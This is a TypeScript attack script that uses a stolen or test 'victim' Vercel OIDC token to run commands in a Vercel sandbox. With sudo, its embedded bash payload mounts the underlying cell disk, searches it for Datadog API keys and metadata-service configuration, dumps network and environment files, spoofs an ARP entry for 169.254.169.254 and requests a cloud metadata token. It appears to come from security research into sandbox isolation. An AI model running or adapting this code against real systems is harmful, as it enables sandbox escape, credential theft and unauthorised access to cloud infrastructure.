import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const EXPLORE = `#!/bin/bash
set +e
mkdir -p /mnt/vda2
mount -t xfs /dev/vda /mnt/vda2 2>/dev/null
R=/mnt/vda2
echo "===== network config files on cell disk ====="
ls -la $R/etc/network/ $R/etc/systemd/network/ $R/etc/NetworkManager/ 2>&1 | head -40
echo "===== grep MMDS/169.254 across cell rootfs (quick) ====="
grep -rls --include='*' -e "169.254.169.254" -e "mmds" -e "MMDS" $R/etc $R/opt $R/run 2>/dev/null | head -20
echo "===== grep datadog api key cached ====="
grep -rls -e "datadog_api_key" -e "api-key" -e "DATADOG_API_KEY" $R/etc $R/opt $R/var 2>/dev/null | head -20
echo "===== find firecracker config / launch artifacts ====="
find $R -maxdepth 4 -iname '*microvm*' -o -iname '*firecracker*' -o -iname '*mmds*' 2>/dev/null | grep -v proc | head -20
echo "===== DHCP leases ====="
find $R -name '*lease*' 2>/dev/null | head; cat $R/var/lib/NetworkManager/*.lease* 2>/dev/null | head
cat $R/run/*.lease* 2>/dev/null | head
echo "===== interfaces / resolve ====="
cat $R/etc/network/interfaces 2>/dev/null | head
cat $R/etc/resolv.conf 2>/dev/null | head -5
echo "===== /var/celld, /run/celld, env files ====="
ls -la $R/var/celld/ $R/run/celld/ 2>&1 | head
cat $R/etc/default/vector $R/etc/environment $R/run/celld-env* 2>/dev/null | head -20
echo "===== vector tomls render check (env vars) ====="
cat $R/etc/vector/sinks/datadog_logs.toml 2>/dev/null | head -20
echo "===== cell network route to 169.254 in proc ====="
cat /proc/net/route 2>/dev/null
cat /proc/net/arp 2>/dev/null
echo "===== try adding ARP entry to MMDS ====="
arping 169.254.169.254 -c 2 2>&1 | head -5
ip neigh add 169.254.169.254 lladdr 02:fc:00:00:00:01 dev eth0 nud permanent 2>&1
timeout 3 curl -s --max-time 3 http://169.254.169.254/latest/api/token -X PUT -H "X-metadata-token-ttl-seconds: 60" 2>&1 | head -c 200
echo
echo DONE`;

const SCRIPT = `set +e
cat > /tmp/explore16.sh <<'EXPLORE_EOF'
${EXPLORE}
EXPLORE_EOF
sudo unshare -m --propagation private bash /tmp/explore16.sh 2>&1
echo "=== rc: $? ==="
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 180_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });